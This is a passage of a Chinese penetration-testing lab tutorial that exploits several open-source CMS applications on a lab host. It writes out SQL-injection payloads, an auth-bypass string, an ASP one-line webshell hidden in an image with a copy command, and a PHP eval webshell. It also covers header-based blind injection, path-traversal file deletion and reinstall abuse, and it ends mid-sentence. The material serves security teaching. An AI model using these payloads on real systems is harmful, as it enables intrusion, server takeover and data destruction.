I将请求发送给Intruder测试器\n\n![](https://cdn.anyiblog.top/common/1648712481513-a19bf378-9ebd-43ae-9a4a-29a8eb6e072e.jpg)\n转到测试器——位置，目标参数不用设置默认即可，点击位置模块，点击右侧的§清除按钮，清除所有自动分配的载荷位置\n\n![](https://cdn.anyiblog.top/common/1648712489031-4965c451-e208-4bba-b726-77c5a5b85892.jpg)\n然后将Bruteforce[i]设置为载荷位置\n\n![](https://cdn.anyiblog.top/common/1648712493389-ddb65506-c204-4029-8a10-9daf2be804eb.jpg)\n接下来我们来设置有效的载荷参数，点击标签页中的有效载荷选项，选择有效载荷类型为运行时文件\n\n![](https://cdn.anyiblog.top/common/1648712497934-f271e0d4-679a-49af-913b-8f9e9537e9d3.jpg)\n此时新增一个有效载荷选项[运行时文件]，点击文件选择......按钮，并定位到桌面上的dict.txt文件\n\n![](https://cdn.anyiblog.top/common/1648712499279-673746a3-b120-4ef8-b66b-2c4370424bd4.jpg)\n![](https://cdn.anyiblog.top/common/1648712503518-2808f12e-be21-411e-8219-b69a4498efa5.jpg)\n最后点击右上角的开始攻击按钮，等待结果即可\n\n![](https://cdn.anyiblog.top/common/1648712505509-4680a525-0d82-4cfe-93aa-5783d00d970f.jpg)\n在结果中发现dcore_user载荷的返回页面长度为14592\n\n![](https://cdn.anyiblog.top/common/1648712510084-b7e89aeb-f696-4b22-93a0-db0a54044e22.jpg)\n通过查看该载荷响应包信息发现其现显示的页面为默认的论坛默认首页\n\n![](https://cdn.anyiblog.top/common/1648712514047-07b9b73b-5dda-47f4-ac88-07ea588568f6.jpg)\n可以确定数据库表名为dcore_user。\n\n用同样的方法判断列是否存在。\n\n用于猜解列名的PoC：\n\nand(select top 1 Bruteforce[j] from dcore_user)\n\n![](https://cdn.anyiblog.top/common/1648712517750-fe7a634f-6c65-4106-b5d7-ee2eff7dce01.jpg)\n枚举结果如下\n\n![](https://cdn.anyiblog.top/common/1648712520761-156ce0fd-f172-4ec1-8fe7-fdd8589fe395.jpg)\n成功枚举出列名user_name和user_password。\n\n使用相同的方法猜解用户名长度，用于猜解用户名长度的PoC：\n\nand iif((select top 1 len((select user_name from dcore_user)) from dcore_user) = Bruteforce[k], 1, 0)\n\n![](https://cdn.anyiblog.top/common/1648712525261-7954f419-9f5d-40bd-ba39-e00ff407e83e.jpg)\n枚举结果如下：\n\n![](https://cdn.anyiblog.top/common/1648712527047-49f22181-dcd2-4931-b4ee-1ac3d772a33f.jpg)\n发现用户名的长度为5。\n\n使用相同的方法猜解用户名的值，用于猜解用户名值的PoC：\n\nand iif((select mid((select user_name from dcore_user), num[j],1) from dcore_user)='Bruteforce[k]',1,0)\n\n由于前面我们已经猜出了用户名长度为5，接下来只需要替换Bruteforce[k]为26个字母，替换num[j]为自然数1，2，3，4，5即可，第一个字母a已经判断出来，判断第二个字母，则使用以下paylaod\n\n![](https://cdn.anyiblog.top/common/1648712529339-ca3ab219-c961-4ecd-8bed-1dc59e31c457.jpg)\n位置参数配置，攻击类型选择集束炸弹(Clusterbomb)\n\n![](https://cdn.anyiblog.top/common/1648712534564-eeabda31-c2e3-4e46-b3dd-498c3db25dd3.jpg)\nIntruder及有效载荷位置的配置参数如下\n\n![](https://cdn.anyiblog.top/common/1648712538726-c2d05f51-dd3c-4332-9747-791348029841.jpg)\n枚举结果如下\n\n![](https://cdn.anyiblog.top/common/1648712544447-1d4d4f62-74be-487a-89f4-2477ac8c8dd1.jpg)\n很快可以猜出用户名为admin。\n\n当前已知表（dcore_user）和列名(user_nameuser_password),接下来可以这样来查询，用于猜解admin用户密码的PoC\n\n![](https://cdn.anyiblog.top/common/1648712550143-cad58958-a978-4fa6-a3d5-ae8d0a873c16.jpg)\n得到如下的信息\n\n![](https://cdn.anyiblog.top/common/1648712551629-901f1fd4-b117-41b3-afd7-1c155b0182a5.jpg)\n注意到这里可以看到加密的密码信息，需要去进行密码解密，加密的格式为MD5，解密后知道密码为admin，\n\n![](https://cdn.anyiblog.top/common/1648712555149-b4c3c9f8-14a5-49a0-97b1-cf2cdb977b16.jpg)\n登录界面的地址为172.16.1.200:8081/admin\n\n![](https://cdn.anyiblog.top/common/1648712560160-7914445e-efed-4233-ac16-f36e4977eeef.jpg)\n登录服务器\n\n![](https://cdn.anyiblog.top/common/1648712584847-ddb5c14c-c600-4a91-adc6-d1545b2c5ab5.jpg)\n如果不能正常跳转，需要手动点击管理界面\n\n![](https://cdn.anyiblog.top/common/1648712589610-8747348f-8452-496d-a8e2-1e5ecad3749f.jpg)\n登陆成功后，可以看到后台管理的信息\n\n![](https://cdn.anyiblog.top/common/1648712592518-49de564e-12f1-4a7f-b289-19b7eae82555.jpg)\n进入到风格管理界面中，在这个界面中可以看到有两个主题的信息，一个缺省信息，一个wp信息，目前版本的功能尚未完善，所以无法对其他模板进行编辑，只能使用默认模板，在左侧也能看到两个信息，风格管理和模板管理\n\n![](https://cdn.anyiblog.top/common/1648712595759-8d5370db-8ea2-4fd6-a2a9-da887b421516.jpg)\n进入到模板管理中，选择风格为default，也就是缺省风格，在这里可以看到一些文件名称，而这些文件名都是在服务器中存在的信息，我们可以利用这一点进行文件的修改，从而达到自身的目的，可以看到这些文件的格式均为html，也就是静态页面的信息\n\n![](https://cdn.anyiblog.top/common/1648712600870-96d5c91d-fad3-4348-9a9e-7aa60e6f5c7d.jpg)\n对list.html进行编辑，打开可以看到里面的源码，在源码中可以看到这是一个静态页面，里边也有一些DIV框架和jsp脚本信息\n\n![](https://cdn.anyiblog.top/common/1648712607806-28de2e99-37fb-4357-965b-d56fa0a36b66.jpg)\n打开虚拟机，可以根据之前看到的模板路径找到list.html页面，打开并查看\n\n源码信息，截取部分信息，可以看到和网站中的信息一致，该文件路径位于C:Intepubwwwrootdcoretemplatedefaultlist.html\n\n![](https://cdn.anyiblog.top/common/1648712611467-10695514-8696-481b-8881-4c944aecc909.jpg)\n进入靶机中查看该页的页面信息\n\n![](https://cdn.anyiblog.top/common/1648712614377-86c4a79b-531d-4cd2-ba5c-e796a2e22468.jpg)\n确认了以上信息之后开始对页面进行修改，创建出一个文件上传的页面信息\n\n![](https://cdn.anyiblog.top/common/1648712619078-e7adf200-c1a8-4787-ab19-8af499395326.jpg)\n![](https://cdn.anyiblog.top/common/1648712625208-9ba57d30-87af-4a82-8c82-a66437958ac9.jpg)\n编辑完成后需要点击编辑进行保存\n\n![](https://cdn.anyiblog.top/common/1648712626090-f4220474-92a6-407d-858a-0472615fa554.jpg)\n在靶机中检查，list.html文件，可以看到信息出现了改变，说明，此文件夹有写入权限\n\n![](https://cdn.anyiblog.top/common/1648712629566-5e6f14e3-0783-4eb7-bdc1-0e057bd3a7c3.jpg)\n在页面中访问信息，路径之前在风格管理中的模板有写，所以直接访问，查看修改后的界面信息，能够看到一个上传界面信息，和最初预想的结果毫无任何差异\n\n![](https://cdn.anyiblog.top/common/1648712632377-e3f8c17d-6290-4f9f-b817-8fec6cf8ccc2.jpg)\n创建木马文件wehshell.asp，上传一个asp的木马文件，木马代码<%eval request(\"cmd\")%>\n\n![](https://cdn.anyiblog.top/common/1648712635083-c5e89cea-2d24-4048-83e2-d25cdfdfb76d.jpg)\n上传后看到没有任何信息\n\n![](https://cdn.anyiblog.top/common/1648712643814-4cc0abad-e326-4ab5-82ed-524601e47110.jpg)\n对空白网页查看网页源代码信息，能够看到一个脚本的信息，在脚本中可以看到文件的名称及上传的路径\n\n![](https://cdn.anyiblog.top/common/1648712650769-17d9b5ee-b987-4573-8c4b-157b185bf6b8.jpg)\n![](https://cdn.anyiblog.top/common/1648712655587-32de208d-528b-4aaf-80f7-3e1a7dd8538e.jpg)\n上传路径为/dcore_standard/uploads/，文件名称为2020010819525723.asp同时也能看到数字202，代表含义是上传信息限制。\n\n尝试打开上传后的木马页面，发现并没有成功上传\n\n![](https://cdn.anyiblog.top/common/1648712658107-b922f306-4f9f-422f-8424-0b62b2949ac0.jpg)\n再次访问<http://172.16.1.200:8081/template/default/list.html>尝试上传桌面上的github.jpg图片，发现图片可以正常的上传到服务器中\n\n![](https://cdn.anyiblog.top/common/1648712683854-ab665928-3308-428f-b2eb-f84044a5856a.jpg)\n使用命令copy github.jpg/b+webshell.asp/a webshell.jpg\n\n将木马合并到图片中, 然后将webshell.jpg改名为webshell.asp.jpg\n\n![](https://cdn.anyiblog.top/common/1648712691375-5d7265af-746c-4321-a115-7bcee5197c46.jpg)\n再次上传图片\n\n![](https://cdn.anyiblog.top/common/1648712694028-c152483c-02a0-42b2-997a-c31d2b40b45b.jpg)\n访问上传的页面查看是否上传成功\n\n![](https://cdn.anyiblog.top/common/1648712717337-1326f2c1-22b6-4330-b4a5-a8d69d879fea.jpg)\n打开桌面上的中国菜刀，使用工具chopper.exe连接asp木马\n\n![](https://cdn.anyiblog.top/common/1648712721522-e1359aa9-3c94-4627-8a50-74ca3706a3e1.jpg)\n连接成功\n\n![](https://cdn.anyiblog.top/common/1648712726171-62a26ac1-00e7-42bd-baf0-94a49849ee6c.jpg)\n# P043-开源CMS实战渗透测试-万众电子期刊在线阅读系统SQL注入\n\n漏洞处： pentest/cms/wanzhong/admin\n\n访问地址http://172.16.1.200/pentest/cms/wanzhong/admin进入万众期刊在线阅读系统的管理后台登录\n\n![](https://cdn.anyiblog.top/common/1648712731311-70bd1e8e-23dd-414c-834e-662e6fbeddba.jpg) \n根据第三步的代码审计，对输入框中的管理员一栏尝试万能用户名注入，admin' OR 'A'= 'A\n\n![](https://cdn.anyiblog.top/common/1648712736712-d449bdf7-102d-46e8-8ac8-db45e868c3b1.jpg) \n登录成功后，可以看到登录的账号是admin' OR 'A'='A，说明以注入的方式进入的系统中的\n![](https://cdn.anyiblog.top/common/1648712740274-b508dc80-2488-4165-b8f7-669617cb0284.jpg) \n对网站数据库的列数进行爆破，用于之后渗透做信息准备，第一次尝试，使用order by进行爆破\n\n![](https://cdn.anyiblog.top/common/1648712745943-b3557741-b51b-491d-a3ce-c993f3a604ff.jpg) \n发现可以登录\n![](https://cdn.anyiblog.top/common/1648712751773-f40a8a69-96ff-4b11-b0e2-8b27b19ffe20.jpg) \n第二次尝试\n![](https://cdn.anyiblog.top/common/1648712756741-d035451b-4205-4b6d-9cdd-dc4c57d303ed.jpg)\n \n发现可以登录\n![](https://cdn.anyiblog.top/common/1648712760053-ce7e2702-66ea-4193-9b04-7f1698efd7d9.jpg) \n直到第六次尝试\n![](https://cdn.anyiblog.top/common/1648712775826-2d2ca879-324d-4014-b3c1-25f05812f5ac.jpg) \n发现代码的信息与前面的不同\n![](https://cdn.anyiblog.top/common/1648712776567-3b5ae131-a2ea-460f-aa69-aaffac0ec15e.jpg) \n再次使用返回键时，返回的是登录界面而不是登录后的界面\n![](https://cdn.anyiblog.top/common/1648712781340-8de7bf92-8224-4d6a-99a1-e12fc189b2aa.jpg) \n从上面的6次尝试结果来看，可以得知数据库有5列信息。\n \n可以尝试对服务器进行路径破解，在网页路径中添加如下路径，进行上传路径探测，就能看到错误信息，并连带着网页在服务器的位置出现在页面中\n/admin/includes/upload.inc.php?action=upfile\n![](https://cdn.anyiblog.top/common/1648712783296-b3a8152c-f0b1-4ade-8769-c0fa49e36f26.jpg) \n \n找到网站的上传路径后，可以对服务器进行文件上传渗透测试，回到Chrome浏览器，新建一个标签页在地址栏中输入chrome://settings/system，选中打开代理设置\n![](https://cdn.anyiblog.top/common/1648712809978-68d4cf4a-9c65-4fbf-85c5-07e536d7220d.jpg) \n如下图所示设置浏览器代理\n![](https://cdn.anyiblog.top/common/1648712831659-574828e9-8f8a-41d7-87df-121a19fc745e.jpg) \n然后使用桌面上的 Burpsuite抓包工具进行数据包截取上面访问的URL的数据包。\n![](https://cdn.anyiblog.top/common/1648712834585-986370e8-2046-4f02-8fef-94619ee52d82.jpg) \n右键点击空白处，选择将数据包发送给Repeater\n![](https://cdn.anyiblog.top/common/1648712839647-0bffb8ba-2949-4788-8341-ac2e8383f39a.jpg) \n在标签栏中选择重发器，进入Repeater重发器中，选择发送\n![](https://cdn.anyiblog.top/common/1648712845121-fd547b45-d621-4637-8217-d2678f872da6.jpg) \n得到网站的真实路径：\nC:\\phpStudy\\WWW\\pentest\\cms\\wanzhong\\admin\\includes\\upload.inc.php，通过查看首页的图片源码发现图片位于./upload/bannerpic/，接下来我们将对目录/upload/bannerpic进行读写测试\n![](https://cdn.anyiblog.top/common/1648712901486-77eeec57-9275-4d7b-9f0d-874703f44b78.jpg) \n将<?php @eval($_POST[‘A’]);?>用hex编码转化为服务器能够识别的hex编码，使用浏览器中安装的hackbar插件进行转换\n![](https://cdn.anyiblog.top/common/1648714156347-11339fcf-8870-40ad-ab23-2838ad9c0b1a.jpg)转换后的结果为\n![](https://cdn.anyiblog.top/common/1648712908202-6423a9fa-cdf6-489c-abb6-a4de57d581c5.jpg)构造如下payload，替换掉username的参数内容并进行发包，注意在payload的首部需要添加0x字段，payload才能正常被识别\n![](https://cdn.anyiblog.top/common/1648712946002-35939e7d-9ffe-4d84-bbea-7af2ce4e5a8a.jpg) \n再次访问http://172.16.1.200/pentest/cms/wanzhong/admin页面，使用用户名admin密码1，并截取访问的数据包，发送给Repeater并使用构造的payload进行拼接\n![](https://cdn.anyiblog.top/common/1648714162302-ab2da209-a02c-4e2b-83f7-30703e896dd0.jpg) \n使用中国菜刀进行连接\n![](https://cdn.anyiblog.top/common/1648714166001-f5c4bf8c-692d-4c01-b007-2b471f1173c7.jpg)连接成功\n![](https://cdn.anyiblog.top/common/1648714168694-f7ca8d39-7326-414a-bd34-fe88335682ac.jpg)\n# P044-开源CMS实战渗透测试-zzCMS论坛SQL注入\n\n  \n\n![](https://cdn.anyiblog.top/common/1648713045813-c0c73aa8-31d2-4238-aa6f-baa725e7c7f7.jpg)\n点击自动审计按钮\n\n![](https://cdn.anyiblog.top/common/1648713047623-a6344bcc-724e-4138-bf8e-28438f13c14e.jpg)\n当自动审计完成时，我们需要根据自动审计的结果，进行逐一验证。当然，我们不需要真的每个文件都审计一遍，可以根据扫描报告中的漏洞详细信息来判断是否可能存在漏洞，如果你觉的某个地方可能存在，这时，你再打开具体文件查看。\n\n![](https://cdn.anyiblog.top/common/1648713050124-ac4600ae-0a36-426b-b065-3554de7597a0.jpg)\n如果想要查询某个变量或者函数在代码中的具体位置，也可以使用全局定位搜索，Seay源代码审计软件会快速地定位找出具体文件，这一功能大大加快了我们代码审计的速度。对于来自用户的数据以及后端对数据库的操作，我们要特别注意。\n\n通过审计全站发现“/user/del.php”的开头两行包含了两个文件“/inc/conn.php”、“/user/check.php”,\n\n![](https://cdn.anyiblog.top/common/1648713053327-184a5ffa-53ae-499a-a7e4-639f3b137398.jpg)\n在文件“/inc/conn.php”中又包含了两个关键文件：“/inc/function.php”、“/inc/stopsqlin.php”,\n\n![](https://cdn.anyiblog.top/common/1648713056225-3dbd7984-c87f-4493-ab32-0b784956e1a7.jpg)\n其中function.php提供一些关键的功能函数，而stopsqlin.php的主要用途为防止SQL注入，对REQUEST的数据进行过滤，在全局搜索中以关键词stopsqlin来进行搜索，发现在很多地方都引用了该文件\n\n![](https://cdn.anyiblog.top/common/1648713102783-07731df2-ffc2-45c1-9f81-eb6c707446ba.jpg)\nstopsqlin.php，其具体代码如下\n\n![](https://cdn.anyiblog.top/common/1648714176990-ae57c8ec-7a56-4e2d-9649-3d541aeab6f2.jpg)\n函数nostr()过滤了一些非法字符，如单引号、左斜杠、右斜杠等。\n\n接下来审计文件“/user/check.php”是否存在可利用的函数，审计发现该文件中存在五处SQL语句查询，第一处的查询的参数在stopsqlin.php中由nostr()函数处理过，在该查询里username和password取自请求头中的 Cookie字段，但是前面讲了/inc/stopsqlin.php文件中对$_COOKIE中的单引号进行了转义，所以无法闭合这句查询的单引号\n\n![](https://cdn.anyiblog.top/common/1648713227075-737ddb3f-ec1e-48b5-ba46-44391274e010.jpg)\n其他四个查询必须以注册身份登录才能执行。先来看第二处的sql语句，经观察发现getip()函数在执行时，不对ip进行任何过滤，且仅仅通过单引号包裹拼接，也就意味着此处的ip可以被伪造。\n\n![](https://cdn.anyiblog.top/common/1648714178181-6b0f9fff-711d-4ddc-9618-61fff502b7d9.jpg)\n使用Seay源代码审计系统的全局搜索功能，检索内容为getip函数代码发现，该函数在文件/inc/function.php被定义，在EditPlus中打开该文件。\n\n![](https://cdn.anyiblog.top/common/1648713293669-410ca80d-a873-401b-b5b7-20b0cf6b8d81.jpg)\n使用EditPlus的查找功能快速定位函数getip()，查找项为getip。\n\n![](https://cdn.anyiblog.top/common/1648714181347-c1d2d8e6-dfb6-4d27-91f4-2797dc183fba.jpg)\n其详细代码为：\n\n![](https://cdn.anyiblog.top/common/1648713301492-156cf255-0ec3-4632-8b63-6fab01f194ce.jpg)\n该函数的功能为获取用户的ip，经审计第103-104行发现这里ip可以从请求头中的 X-Forwarded-For 字段中取到，并且没有对取出来的ip做任何处理，就直接拼接到第二处 sql 查询中。\n\n使用Chrome浏览器输入链接：<http://172.16.1.200/user/login.php>，并在页面中点击免费注册，注册一个用户和密码都是admin的用户，并进行登录。\n\n![](https://cdn.anyiblog.top/common/1648713304736-ec2804b0-c047-41f2-a84f-e8aff037ee16.jpg)\n注册用户：\n\n![](https://cdn.anyiblog.top/common/1648713308825-fd03fe23-e42b-4b9a-89d5-8edcef825121.jpg)\n注册成功后直接跳转为登录状态，进入用户中心，即将用户信息写入Cookie中：\n\n![](https://cdn.anyiblog.top/common/1648713310567-f1b3a34f-3ff1-41e6-813a-3f0a126dadcc.jpg)\n回到Server2012靶机的网站中查看mysql数据库，左键点击靶机桌面右下角的wamp软件图标，选择MySQL项，最后点击MySQL控制台(M)， \n\n![](https://cdn.anyiblog.top/common/1648713313775-193691e6-cf86-412b-85f8-352074de90e0.jpg)\n密码为空，进入MySQL控制台，然后使用命令use zzcms调用网站的库，然后使用命令select loginip from zzcms_user;查看zzcms_user表中的loginip字段中的值，\n\n![](https://cdn.anyiblog.top/common/1648713316581-d20b10de-63d7-484a-878d-3cf89f8321f3.jpg)\n打开C:PentestBoxPentestBox.exe，渗透终端输入命令burpsuite打开抓包软件，并设置浏览器代理。在URL中键入<chrome://settings/system>\n\n![](https://cdn.anyiblog.top/common/1648713321706-027a16fd-47a3-4614-97a0-f0c9c58f83f8.jpg)\n进行如下设置：\n\n![](https://cdn.anyiblog.top/common/1648713326039-8673b937-946b-4b58-9faf-9595bda5c567.jpg)\n在开启代理的状态下访问/user/del.php，\n\n![](https://cdn.anyiblog.top/common/1648713327164-aced9b35-7d7f-4773-bd88-777c13453477.jpg)\n并在报文的末尾添加：Content-Length: 0换行X-Forwarded-For: 8.8.8.8两次换行\n\n![](https://cdn.anyiblog.top/common/1648713333007-ab019dd1-ff7a-4d17-8a2f-67a443f06038.jpg)\n![](https://cdn.anyiblog.top/common/1648713334721-26311ae0-b729-4b1e-9ef0-202ddd2df814.jpg)\n可以发现数据库中的loginip字段被修改了，结束此步后退出登录，停止抓包，下面尝试一下基于时间的盲注。\n\n进入靶机打开桌面上的Visual Studio Code工具，由于我们已经在里面进行过实验，直接定位到/user/del.php，在第三行的check.php 处下断点，\n\n![](https://cdn.anyiblog.top/common/1648713338298-caecfa3b-4452-4f2f-a771-15ce7719cb54.jpg)\n然后到/user/check.php中第一次的SQL查询处（位于19行的位置）也下一个断点，并在语句前添加一个$test变量查看一下ip值：\n\n![](https://cdn.anyiblog.top/common/1648713341020-b0a6b037-41aa-498c-83b2-86e95ddc6691.jpg)\n使用快捷键F5来开启vscode监听，并再次使用admin用户名登录网站中访问/user/del.php，此时我们回到vscode中，到php代码运行到了断点位置即触发了断点，变量中的初始状态如下：\n\n![](https://cdn.anyiblog.top/common/1648713349302-95de795f-9f69-4ece-95c4-b7653179ee64.jpg)\n在调试控制台中对测试的$test变量进行修改：\n\n![](https://cdn.anyiblog.top/common/1648713350707-820cd9e1-2527-4e90-b972-1180b7668912.jpg)\n具体操作如下，在调试控制台中键入以上代码并回车，\n\n![](https://cdn.anyiblog.top/common/1648713353404-68355915-2c5d-46e5-b5b3-55daa9cd82d0.jpg)\n可以发现ip值未经过任何处理，可以进行任意构造，取消vscode代理。接下来在渗透机中再次打开Burpsuite代理，具体操作步骤参照第七步，设置完代理后，让数据包转发至burp中，然后使用Repeater功能进行重放，并在末尾添加如下代码：(注意：结尾处有两个换行)\n\n![](https://cdn.anyiblog.top/common/1648713355015-2b1c802c-d571-43e1-b4ac-e638b6374120.jpg)\n![](https://cdn.anyiblog.top/common/1648713362255-5af7a02b-d5f8-44a5-a38f-297201b3dffa.jpg)\n点击Go转发按钮后数据包将会延时6s左右，由于虚拟机中查询存在延迟，所以此处多延时了2s，属于正常现象。\n\n![](https://cdn.anyiblog.top/common/1648713364832-454e172f-2ebc-420b-bc27-cfdbc4eac609.jpg)\n盲注成功。\n\n回到渗透机中继续审计源代码，观察/user/check.php中剩下的SQL查询，源代码如下：\n\n![](https://cdn.anyiblog.top/common/1648713369804-73fb5283-3cad-40b0-939d-180a61d97314.jpg)\n在上面的代码中jf_login是一个常量，在/inc/config.php中被定义。其他部分在此处不存在可利用的查询。第一个查询的注入发生在访问/user/del.php文件时，进入了/user/check.php发生了注入。实际上在/user/del.php文件中也存在注入。在包含了/user/check.php文件之后，/user/del.php文件接收了post中的三个参数：（/user/del.php）\n\n![](https://cdn.anyiblog.top/common/1648713372808-a5b915fa-8c7d-4f8d-b88d-5c77311ffa75.jpg)\n该文件从 post 数组中取出了 pagename、tablename和id的值，并对id调用了checkid()进行处理。该函数定义在/inc/function.php中。\n\n![](https://cdn.anyiblog.top/common/1648713376147-09261328-c462-4cf5-a7c8-b0cf60aa6402.jpg)\n这里的checkid()函数是对 id 进行检查，因此我们无法控制 id 进行注入。\n\n继续追溯/user/del.php的代码，下面是一个switch的判断：（省略部分代码）\n\n![](https://cdn.anyiblog.top/common/1648713377841-7d6f6bdf-61a4-459f-acae-653dec33c202.jpg)\n在switch 判断未发现存在有SQL注入点。继续追溯下去：\n\n![](https://cdn.anyiblog.top/common/1648713381503-08331fb8-6802-400d-b74a-74c9145e7754.jpg)\n…\n\n![](https://cdn.anyiblog.top/common/1648713383790-fc7eed21-bb43-49fd-9bf8-a9da92dcac90.jpg)\n…\n\n仔细研读代码发现这里tablename是可以被控制的，当其值不等于 zzcms_guestbook 和 zzcms_dlly 时，便进入到else分支中，在该分支中，并未对tablename进行处理，便拼接进了sql查询中。但是因为tablename是从post数组中取出来的，而前面说到在/inc/stopsqlin.php中对post数据进行了过滤。过滤步骤如下：\n\n![](https://cdn.anyiblog.top/common/1648713385561-18227cb6-1395-4013-9114-87ac54d2e84a.jpg)\n而在拼接 tablename 时不用闭合引号，这里存在基于时间的盲注。可以使用的payload如下：\n\n![](https://cdn.anyiblog.top/common/1648713388731-11481901-fe04-4725-a4ac-983c79929841.jpg)\n由于在/user/del.php中对id进行了判断，所以用户必须要在post中传递id的值否则del.php对id进行判断时会直接执行exit()退出。在复现上面的payload之前，若传入的是数组类型，则每个元素的范围是1<= id <=100000000。若id传入的不是数组，则需要以数字1-9开头，因为查询语句是用and连接，所以如果前面的查询中没有返回信息，则and后面的查询将会失效payload也就不会执行了。在复现payload之前首先进入靶机数据库，直接向zzcms_dl的表中插入一行数据：\n\n![](https://cdn.anyiblog.top/common/1648713392801-80c67082-7a33-49de-85ff-f45e86bad83b.jpg)\n回到vscode，为帮助理解可以将$sql、$tablename和$id添加到监视，方便观察变量的变化，在11行和135行分别下一个断点，继续跟进：\n\n![](https://cdn.anyiblog.top/common/1648713399160-22f59069-7c36-4611-bfdc-4751d3aa9e69.jpg)\n运行到断点后继续运行，没有报错，说明payload执行了，但是在浏览器客户端中无法进行判断，接下来我们再次进入渗透机Win10使用Burpsuite进行代理访问/user/del.php然后进入Reapter构造如下的数据包发送：（注意发包时将GET修改为POST否则payload失效！）\n\n![](https://cdn.anyiblog.top/common/1648713436174-f061ac0a-1846-439b-a8cf-034562d7564d.jpg)\n![](https://cdn.anyiblog.top/common/1648713443578-ab4339aa-5d18-454c-9591-36d4e189d440.jpg)\n可以看到这里payload成功执行了，关闭代理。至此我们已经复现了基于时间的SQL盲注，下面我们将重现文件删除的利用方法。\n\n继续使用前面注册的用户，账号密码都是admin登录到网站中，然后在url中添加路径/user/adv.php，在此页面中用户可以添加或修改广告信息，\n\n![](https://cdn.anyiblog.top/common/1648713448641-b011410d-4e11-46b5-a02b-81f776805f5e.jpg)\n该页面代码前两行内容如下：\n\n![](https://cdn.anyiblog.top/common/1648713449853-85f99385-296f-43b3-b192-d1a77b45b436.jpg)\n根据上面的审计/user/check.php为验证登录信息的文件，/inc/conn.php是连接数据库的文件，该文件中包含了/inc/stopsqlin.php，对get、post、cookie等函数中的数据进行了过滤。继续审计/user/adv.php文件中的其他代码：\n\n![](https://cdn.anyiblog.top/common/1648713452855-13d14e50-9f5b-469b-8b99-589e0c4fff46.jpg)\n…\n\n![](https://cdn.anyiblog.top/common/1648713463980-9008d40c-0f49-4a15-8dc0-d9efac5acc3a.jpg)\n…\n\n![](https://cdn.anyiblog.top/common/1648713470679-63695100-e145-4d44-966c-cbe5262cdb57.jpg)\n这里我们可以看到img和oldimg两个的值取自request数组，通过抓包的方式便可以清楚的看到是来自post数组的，由于我们只是测试并未上传图片，所以此处抓到的包里的值为空的(注意：只有在上传了一次广告后，才会出现oldimg)\n\n![](https://cdn.anyiblog.top/common/1648713473605-7c6d9420-afed-46bb-9992-6ea9365ab192.jpg)\n而前面/inc/stopsqlin.php文件中对 post 的处理中并没有过滤.、/字符，导致可以跨目录删除文件。action的值提交是来自get数组，当其值为modify或者 add时，只要img和oldimg值不相等，都会导致该漏洞。因为之前我添加过广告了，这里就用modify的条件语句复现一下。先随便在网站根目录找一个目录，这里用/admin目录，在该目录下创建一个deltest.php文件。\n\n![](https://cdn.anyiblog.top/common/1648713475090-cb29e66f-69c2-4c02-b549-46c15375f909.jpg)\n回到渗透机中，再次将数据包发送到Repeater后，数据包构造参考下面的步骤：\n\n![](https://cdn.anyiblog.top/common/1648713476323-01277823-c662-4edf-a2aa-c719880a8fac.jpg)\n…\n\n![](https://cdn.anyiblog.top/common/1648713478640-02fafd3e-5d6c-4b44-888f-4079ec1f64b1.jpg)\n最后修改完后，点击Go转发数据包，回到靶机中发现文件已经成功被删除了。尝试将action修改为add，不带cookie，只要对目录有读写权限删除网站目录之外的文件，同样是可行的，复现过程不再演示。在/user/licence_save.php中，也存在相同的问题。\n\n使用vscode快捷键Ctrl+Shift+F全局搜索一下关键词为:oldimg，\n\n![](https://cdn.anyiblog.top/common/1648713484822-524d1439-190c-4f27-aa05-6b2b4b8f3753.jpg)\n发现 /user 目录下的 manage.php、ppsave.php、zssave.php文件都存在一样的问题。实际上在 /admin 目录下的一些文件中也存在类似问题。随便看一个/admin/ad_user_modify.php\n\n![](https://cdn.anyiblog.top/common/1648713487112-cff6c1b9-08c5-4c33-9df9-0b6d550bcf2b.jpg)\n定位到oldimg的具体位置：\n\n![](https://cdn.anyiblog.top/common/1648713488589-c0598f3b-98c4-4d0e-bc1b-3d815196ec26.jpg)\n接下来访问一下该页面，因为该文件在 /admin 目录，所以需要后台管理的权限。这里使用admin为用户名和123456为密码进行登录，在/user目录下的文件删除漏洞其实不需要前台用户登录，因其验证登录状态的/user/check.php文件并没有终止脚本的执行，而/admin目录下存在验证用户身份的文件/admin/admin.php中如果身份出错就会调用 showmsg()。可以看到ad_user_modify.php`为一个修改广告信息的页面：\n\n![](https://cdn.anyiblog.top/common/1648713493307-f780e994-7022-49aa-abc6-402ab63a9de6.jpg)\n接下来使用右键查看网页源码来查看网站相应的源代码：（定位到24行的位置）\n\n![](https://cdn.anyiblog.top/common/1648713496400-de594df9-6678-442a-9b79-56fba0ec9a80.jpg)\n可以看到该表单提交上来的oldimg的type属性是hidden，我们只需要抓包后修改即可。再看一下/admin/ad_user_modify.php中的源码：（关键代码已用红框框出分别为12、18、22-29行）\n\n![](https://cdn.anyiblog.top/common/1648713500560-4ff49a33-eb51-48e3-a201-6c10481aa91a.jpg)\n抓包后将post中的数据改为oldimg=filename&img=xxx&action=modify即可，此处只作关键分析，具体利用步骤不再累述。\n\n接下来我们来进行网站重装的利用，首先与网站安装功能相关的目录为/install目录，打开index.php文件，该文件没有检测/install/install.lock文件是否存在，/install/index.php的相关代码如下：（只截取了相关代码）\n\n![](https://cdn.anyiblog.top/common/1648713504092-7593368a-e15f-4381-a4f3-73a5821d3204.jpg)\n…\n\n通过对文件进行逐个审计发现，只有/install/step_1.php文件在开头检查了/install/install.lock。 而在/install/step_2.php、/install/step_3.php、/install/step_4.php、/install/step_5.php、/install/step_6.php文件中都没有对/install/install.lock文件进行检查。该漏洞利用不需要带前台用户的 cookie，\n\n![](https://cdn.anyiblog.top/common/1648713507567-797fd39b-1087-43ac-88f4-e7eee5f25561.jpg)\n可以看到我们进入了安装向导的界面。同理 step 传入 3 也一样可以触发该漏洞：我们只需要通过post传入 id，并设置其值为 2、3、4、5、6 之一即可，首先访问/install/index.php，同时打开BurpSuite进行代理，如下构造数据包\n\n![](https://cdn.anyiblog.top/common/1648713513313-f1663ac0-89ba-4909-86de-64cbd4a3a5ce.jpg)\n该重装的漏洞的利用是，管理员未删除/install文件夹及里面相应的文件导致的。\n\n已知论坛中存在重装漏洞，接下来进行网站getshell获取网站权限，\n\n回到服务器中对/install/index.php进行审计。文件开头采用extract()函数来注册变量，且该文件中没有对get、post数组中的数据进行过滤。\n\n![](https://cdn.anyiblog.top/common/1648713514605-2e1f6a70-fdd8-42d0-a504-78b53051c5c7.jpg)\n下面的 switch 分支主要看 step = 5 